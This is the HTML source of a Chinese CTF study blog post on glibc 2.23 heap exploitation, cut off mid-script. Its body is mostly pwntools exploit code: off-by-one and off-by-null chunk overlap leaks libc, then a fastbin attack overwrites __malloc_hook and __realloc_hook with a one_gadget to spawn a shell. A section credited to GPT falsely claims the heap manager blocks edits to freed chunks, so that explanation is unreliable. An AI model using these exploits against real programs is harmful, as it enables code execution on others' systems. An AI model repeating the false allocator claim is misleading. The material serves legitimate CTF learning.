@@ -1,0 +1,649 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"default"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="一、2.231.off by one，fastbin attack打malloc1.通过off by one使堆块合并泄露libc 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667add(0x18">
+<meta property="og:type" content="article">
+<meta property="og:title" content="off by">
+<meta property="og:url" content="http://example.com/2025/11/18/off-by/index.html">
+<meta property="og:site_name" content="小小pwn">
+<meta property="og:description" content="一、2.231.off by one，fastbin attack打malloc1.通过off by one使堆块合并泄露libc 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667add(0x18">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/11/18/off-by/1745248759641-3442749b-f9d2-4521-b6c1-bec1d5696628.png">
+<meta property="og:image" content="http://example.com/2025/11/18/off-by/1745249142830-94a71698-c3b0-407d-a470-c786b5ef7099.png">
+<meta property="og:image" content="http://example.com/2025/11/18/off-by/1746007709112-a7f5c2e3-83ca-4f0f-9742-bfce77c46c6b.png">
+<meta property="og:image" content="http://example.com/2025/11/18/off-by/1746007838236-91ddcba5-2ab1-46ce-844d-cf5a23f0db6d.png">
+<meta property="og:image" content="http://example.com/2025/11/18/off-by/1746008033010-c13621b5-d279-49ff-a74d-f0834cee937d.png">
+<meta property="og:image" content="http://example.com/2025/11/18/off-by/1746008218170-31b13aa1-958a-4564-8a0f-c1e47309e3a6.png">
+<meta property="og:image" content="http://example.com/2025/11/18/off-by/1746008319273-63c13c3d-d23d-4b7c-8c14-90b89379424b.png">
+<meta property="article:published_time" content="2025-11-17T16:25:31.000Z">
+<meta property="article:modified_time" content="2025-11-17T16:27:43.612Z">
+<meta property="article:author" content="和方煜">
+<meta property="article:tag" content="知识点">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/11/18/off-by/1745248759641-3442749b-f9d2-4521-b6c1-bec1d5696628.png">
+
+<link rel="canonical" href="http://example.com/2025/11/18/off-by/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>off by | 小小pwn</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">小小pwn</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/11/18/off-by/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="和方煜">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小小pwn">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          off by
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-11-18 00:25:31 / 修改时间：00:27:43" itemprop="dateCreated datePublished" datetime="2025-11-18T00:25:31+08:00">2025-11-18</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%A0%86/" itemprop="url" rel="index"><span itemprop="name">堆</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>9.6k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>9 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <hr>
+<h1 id="一、2-23"><a href="#一、2-23" class="headerlink" title="一、2.23"></a>一、2.23</h1><h2 id="1-off-by-one，fastbin-attack打malloc"><a href="#1-off-by-one，fastbin-attack打malloc" class="headerlink" title="1.off by one，fastbin attack打malloc"></a>1.off by one，fastbin attack打malloc</h2><p>1.通过off by one使堆块合并泄露libc</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;cccc&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;dddd&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;\xe1&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node3.buuoj.cn&#x27;,28465)</span></span><br><span class="line">p=process(<span class="string">&#x27;./vm&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./vm&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/he/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">        p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;size?&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;content:&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">        p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;idx?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;content:&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">idx</span>):</span><br><span class="line">        p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;idx?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">        p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;idx?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;cccc&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;dddd&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;\xe1&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">fd = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;fd:&#x27;</span>+<span class="built_in">hex</span>(fd))</span><br><span class="line">libc_base = fd - <span class="number">0x3c4b78</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">fake_chunk_addr=malloc_hook-<span class="number">0x23</span></span><br><span class="line">log.success(<span class="string">&#x27;fake_chunk_addr:&#x27;</span>+<span class="built_in">hex</span>(fake_chunk_addr))</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">4</span>,p64(fake_chunk_addr))</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">one_gadget=libc_base+<span class="number">0x4527a</span></span><br><span class="line">realloc_addr=libc_base+libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;realloc_addr:&#x27;</span>+<span class="built_in">hex</span>(realloc_addr))</span><br><span class="line">log.success(<span class="string">&#x27;one_gadget:&#x27;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x13</span>-<span class="number">0x08</span>)+p64(one_gadget)+p64(realloc_addr+<span class="number">12</span>)</span><br><span class="line">bug()</span><br><span class="line">add(<span class="number">0x68</span>,payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;size?&quot;</span>,<span class="built_in">str</span>(<span class="number">0x18</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>add(0x18, ‘aaaa’) #0</p>
+<p>必须是0x8结尾，这样才能覆盖size位</p>
+<p>add(0x68, ‘aaaa’) #1</p>
+<p>add(0x68, ‘aaaa’) #2</p>
+<p>合并的堆块要进入unsortbins</p>
+<p>add(0x10, ‘aaaa’) #3</p>
+<p>payload &#x3D; ‘a’*0x18 + ‘\xe1’  </p>
+<p>\xe1是两个堆块合并后size位的大小</p>
+<p>edit(0, payload) </p>
+<p>往堆块0里面写因为off by one多写一个字节，使堆块1的size位被覆盖使得堆块1，2合并</p>
+<p>delete(1)           </p>
+<p>free掉堆块1，虽然在gdb中显示的是合并的整个大堆块被free了，但是堆块2并未被真正free，指针位未清零</p>
+<p>add(0x60, ‘aaaa’)  </p>
+<p>将堆块1申请出来，堆块2还是被free状态（但是指针位未清零，此时fd与bk都指向main_arena+88，也就是unstort的头）</p>
+<p>show(2）</p>
+<p>打印堆块2，就可以将main_arena+88的地址打印出来，根据偏移就可以算出libc</p>
+<p>fake_chunk_addr&#x3D;malloc_hook-0x23 </p>
+<p>假堆块的地址，为什么要选泽malloc_hook-0x23 因为malloc_hook-0x23，因为这里的size是0x7f，属于fastbin的范围，而且是在malloc_hook与realloc_hook的下面，可以修改其值，执行为one_gadget</p>
+<p>add(0x68,b’\x00’*8)</p>
+<p>将被指针未清零的的堆块2申请出来，也就是堆块4，堆块2，4指向的是同一个位置（所以gdb中只显示四个堆块）</p>
+<p>free(4)</p>
+<p>将堆块4free</p>
+<p>edit(2,p64(fake_chunk_addr))</p>
+<p>通过堆块2修改已经free的堆块4的fd指针，修改为假的堆块地址</p>
+<p>add(0x68,b’aaaa’)</p>
+<p>将堆块4申请出来</p>
+<p>payload&#x3D;b’a’*(0x13-0x08)+p64(one_gadget)+p64(realloc_addr+12)</p>
+<p>#bug()</p>
+<p>add(0x68,payload)</p>
+<p>这个堆块在gdb中是看不到的，但是可以通过查看内存，看内容是否被更改</p>
+<p>这个堆块就是假的堆块了（0x13-0x08）这个是从malloc_hook-0x13的位置开始写入，因为size位0x10，指针指向写入数据的地方，-0x8是因为malloc_hook-0x8就是realloc_hook,将（malloc_hook-0x8）也就是realloc_hook的位置写入one_gadget,将malloc_hook的地方写入realloc_addr+12（这个是为了满足one_gadget调用的条件）</p>
+<ul>
+<li><code>**malloc_hook**</code> <strong>设置为</strong> <code>**realloc+offest**</code>：通过覆盖堆上的函数指针，将 <code>malloc_hook</code> 指向 <code>realloc</code>。</li>
+<li><code>**realloc_hook**</code> <strong>设置为</strong> <code>**one_gadget**</code>：通过覆盖堆上的另一个函数指针，将 <code>realloc_hook</code> 指向 <code>one_gadget</code>。</li>
+</ul>
+<p>这样，程序在调用 <code>malloc</code> 时，会跳转到 <code>realloc</code>，而在执行 <code>realloc</code> 时，会跳转到 <code>one_gadget</code>，最终执行恶意代码</p>
+<p><em>主要原因<strong>、realloc函数中有大量的</strong>push指令**（在执行__realloc_hook之前），因此我们将realloc函数的地址加上一定的偏移，就可以选择去执行一定量的push指令，从而抬高栈帧（我指的抬高栈帧是栈帧又向着低地址增长了）。这样rsp增加了之后，我们就可以控制例如rsp+0x30，让其内存值正好落在0处。</em></p>
+<p><img src="/2025/11/18/off-by/1745248759641-3442749b-f9d2-4521-b6c1-bec1d5696628.png" alt="img"></p>
+<p><img src="/2025/11/18/off-by/1745249142830-94a71698-c3b0-407d-a470-c786b5ef7099.png" alt="img"></p>
+<p>p.recvuntil(“choice: “)</p>
+<p>p.sendline(“1”)</p>
+<p>p.sendlineafter(“size?”,str(0x18))</p>
+<p>p.interactive()</p>
+<p>调用malloc获取shell</p>
+<p>调用malloc函数—-&gt;判断是否有malloc_hook，有则调用之—-&gt;我们这里malloc_hook设置的为realloc函数+offset，程序便到此处执行—-&gt;执行realloc函数时，会判断是否有realloc_hook，有则调用之—-&gt;我们这里realloc_hook设置的为one_gadget，所以便会转到one_gadget处执行。</p>
+<p>疑问：那为什么不可以直接修改堆块2的内容也就是修改fd的值为假堆块，也就是为什么堆块2可以被打印，但无法修改里面的内容</p>
+<p>答案来自gpt：</p>
+<ul>
+<li><strong>堆块合并</strong>：通过修改堆块的 <code>size</code> 字段，堆块1和堆块2被堆管理器合并成一个大的空闲堆块，释放堆块1，虽然gdb中显示整个大堆块被释放，但是堆块2并没有被显式释放。</li>
+<li><strong>堆块2依然存在</strong>：虽然堆块2在gdb中显示被释放，但堆管理器并没有清除其内容，因此堆块2的内存仍然可以被访问，甚至打印出来。</li>
+<li><strong>堆块2无法修改</strong>：因为堆块2已经被堆管理器标记为“空闲”，堆管理器限制了对其的修改操作，以防止潜在的内存破坏和不一致性。</li>
+<li><strong>堆管理的内存保护</strong>：空闲块的内容通常不会被修改，堆管理器会确保内存的完整性，避免对空闲块的修改。只有在空闲块被重新分配或被进一步操作时，堆块的内容才可能被清除或修改。</li>
+</ul>
+<p>fastbins打malloc_hook与free_hook,都把堆块申请在malloc_hook&#x2F;free_hook-0x23</p>
+<h2 id="2-off-by-null"><a href="#2-off-by-null" class="headerlink" title="2.off by null"></a>2.off by null</h2><h3 id="1-利用off-by-null，堆块合并泄露libc"><a href="#1-利用off-by-null，堆块合并泄露libc" class="headerlink" title="1.利用off by null，堆块合并泄露libc"></a>1.利用off by null，堆块合并泄露libc</h3><p>1.有edit</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x200</span>,<span class="string">b&#x27;chunk0&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;chunk1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x1f0</span>,<span class="string">b&#x27;chunk2&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;chunk3&#x27;</span>)</span><br><span class="line">bug()</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0x280</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">bug()</span><br><span class="line">add(<span class="number">0x200</span>,<span class="string">b&#x27;chunk0&#x27;</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">fd = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>add(0x200,b’chunk0’) </p>
+<p>这个随便但是要在unsortbins</p>
+<p>add(0x68,b’chunk1’)</p>
+<p>必须在fastbins，而且必须是0x8结尾，因为这样才能覆盖到chunk2的pre_size位</p>
+<p>add(0x1f0,b’chunk2’)</p>
+<p>堆块的size位必须是整百，这样off by null溢出的\x00就会将p位覆盖为零且不影响size位</p>
+<p>add(0x10,b’chunk3’)</p>
+<p>防止与top_chunk合并</p>
+<p>bug()</p>
+<p>free(0)</p>
+<p>为后来泄露libc做准备</p>
+<p>edit(1,b’a’*0x60+p64(0x280))</p>
+<p>覆盖堆块1的pre_size位与p位，欺骗前面的堆块被free</p>
+<p>free(2)</p>
+<p>使三个堆块合并成一个大堆块</p>
+<p>add(0x200,b’chunk0’)</p>
+<p>将堆块0申请回来，使fd与bk压入堆块1</p>
+<p>show(1)</p>
+<p>泄露libc</p>
+<p>2.没有edit，使用add来修改size位</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x200</span>,<span class="string">b&#x27;chunk0&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;chunk1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x1f0</span>,<span class="string">b&#x27;chunk2&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;chunk3&#x27;</span>)</span><br><span class="line">bug()</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x230</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">bug()</span><br><span class="line">add(<span class="number">0x200</span>,<span class="string">b&#x27;chunk0&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">fd = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>这里就只解释一下为什么是show(0),因为将堆块0，1都free了，所以先申请的0x18的堆块变成了堆块0，后申请的0x200的是堆块1</p>
+<h3 id="2-off-by-null-fastbin-attack-打malloc"><a href="#2-off-by-null-fastbin-attack-打malloc" class="headerlink" title="2.off by null fastbin attack 打malloc"></a>2.off by null fastbin attack 打malloc</h3><p>因为我们将堆块0，又申请出来了，导致堆块1是free状态，可以打印，但无法修改，所以没发改fd，进行fastbin attach</p>
+<p>所以我们再多申请一个，使得四个堆块堆叠，堆块1泄露libc，用堆块2改fd进行fastbin attach</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span> , <span class="string">b&#x27;chunk0&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span> , <span class="string">b&#x27;chun1&#x27;</span>) </span><br><span class="line">add(<span class="number">0x68</span> , <span class="string">b&#x27;chunk2&#x27;</span>) </span><br><span class="line">add(<span class="number">0xf0</span> , <span class="string">b&#x27;chunk3&#x27;</span>) </span><br><span class="line">add(<span class="number">0x10</span> , <span class="string">b&#x27;chunk4&#x27;</span>) </span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">12</span>+ p64(<span class="number">0x290</span>)</span><br><span class="line">edit(<span class="number">2</span> , payload)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x100</span> , <span class="string">b&#x27;chunk0&#x27;</span>) </span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">fd =u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;fd = &#x27;</span>+<span class="built_in">hex</span>(fd))</span><br><span class="line">pause()</span><br><span class="line">libc_base = fd - <span class="number">0x3c4b78</span></span><br><span class="line">malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">fake_chunk_addr=malloc_hook-<span class="number">0x23</span></span><br><span class="line">log.success(<span class="string">&#x27;fake_chunk_addr = &#x27;</span>+<span class="built_in">hex</span>(fake_chunk_addr))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x120</span>, <span class="string">b&#x27;\0&#x27;</span>*<span class="number">0x108</span>+flat(<span class="number">0x71</span>, fake_chunk_addr))</span><br><span class="line">bug()</span><br><span class="line">one_gadget=libc_base+<span class="number">0x4527a</span></span><br><span class="line">realloc_addr=libc_base+libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>]</span><br><span 